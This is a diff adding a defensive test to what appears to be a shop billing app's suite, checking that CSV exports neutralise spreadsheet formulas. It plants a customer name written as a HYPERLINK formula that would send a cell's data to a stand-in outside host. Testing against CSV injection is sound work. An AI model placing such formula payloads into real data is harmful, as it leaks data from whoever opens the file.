@@ -421,3 +421,25 @@ def test_composition_shop_bills_carry_no_tax_and_gst_returns_refuse_it(client):
     for path in ("/api/exports/gstr1", "/api/exports/gstr3b"):
         r = shop.get(path, params={"month": MONTH})
         assert r.status_code == 400 and r.json()["code"] == "gst_composition", path
+
+
+def test_csv_exports_never_start_a_cell_with_a_formula(client):
+    """Review fix: a customer name typed as =HYPERLINK(...) must not run as a formula when the owner opens the
+    export in a spreadsheet (OWASP CSV injection); the server's own fields are left as they are."""
+    from common import csv_text
+
+    assert [csv_text(v) for v in ("=1+2", "+91", "-5", "@SUM(A1)", "Rahul", "")] == ["'=1+2", "'+91", "'-5",
+                                                                                      "'@SUM(A1)", "Rahul", ""]
+    assert csv_text(12.5) == 12.5 and csv_text(None) is None
+    shop = Shop(client)
+    plant = shop.product("Money Plant", 100, 10)
+    name = '=HYPERLINK("https://x.example/?d="&F2,"Rahul")'
+    bill(shop, (plant, 1, 100), phone="9811100009", name=name)
+    bid = shop.get("/api/auth/me").json()["business"]["id"]
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w") as zf:
+        run(exports._write_bills_csv(db(), zf, bid))
+    rows = list(csv.reader(io.StringIO(zipfile.ZipFile(buf).read("invoices.csv").decode("utf-8-sig"))))
+    row = dict(zip(rows[0], rows[1]))
+    assert row["customer_name"] == "'" + name
+    assert row["customer_phone"] == "+919811100009" and row["invoice_number"] == "INV-0001"
